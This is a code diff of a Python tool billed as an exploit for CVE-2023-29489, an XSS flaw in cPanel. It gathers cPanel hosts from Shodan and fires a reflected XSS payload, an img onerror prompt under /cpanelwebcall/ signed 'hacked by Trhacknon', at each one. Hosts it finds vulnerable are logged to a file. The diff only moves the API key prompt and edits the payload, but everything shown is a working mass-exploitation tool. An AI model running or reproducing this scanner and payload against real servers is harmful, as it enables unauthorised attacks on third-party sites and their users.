@@ -9,7 +9,7 @@ from pystyle import *
 import webbrowser
 import socket
 #Coded By Trhacknon
-TM_1915 = 'shodanapikey'
+#TM_1915 = input("Veuillez entrer votre clé API Shodan : ")
 
 if platform.system() == 'Windows':
         os.system(
@@ -34,12 +34,12 @@ def logo_start():
                 ╚═╝░░╚═╝╚═════╝░╚═════╝░  ╚══════╝░╚════╝░╚══════╝╚═════╝░
                         By >> Trhacknon
                                 Exploit CVE-2023-29489\r\r
-	"""
+  """
     Write.Print(f"{logo.replace('░',' ')}",Colors.red,interval=0.0)
     #Coded Trhacknon
 
 
-
+TM_1915 = input("\033[35mVeuillez entrer votre clé API Shodan : \033[0m")
 
 def search_cpanel_hosts(api_key):
     api = shodan.Shodan(api_key)
@@ -65,7 +65,7 @@ def test_xss(url):
     #Coded By Trhacknon
     # Disable SSL certificate validation
     response = requests.get(xss_url, verify=False)
-    
+
     soup = BeautifulSoup(response.text, 'html.parser')
     img_tags = soup.find_all('img', src='x')
     #Coded By Trhacknon
@@ -90,7 +90,7 @@ if __name__ == '__main__':
                         os.system(
                     f'title Exploit XSS - ({int(exploit)}) Not Exploit - ({int(not_exploit)}) Error - ({int(error_connect)})  - By Trhacknon'
                     ) #Coded By Trhacknon
-                    hacked_1312  = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1312)">hacked%20by%20Trhacknon"""
+                    hacked_1312  = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1312,/by_Trkn/)">hacked%20by%20Trhacknon"""
                     xss_1312 = open("xss_1312.txt","a")
                     xss_1312.write(f"{url}{hacked_1312}\n")
                     xss_1312.close()
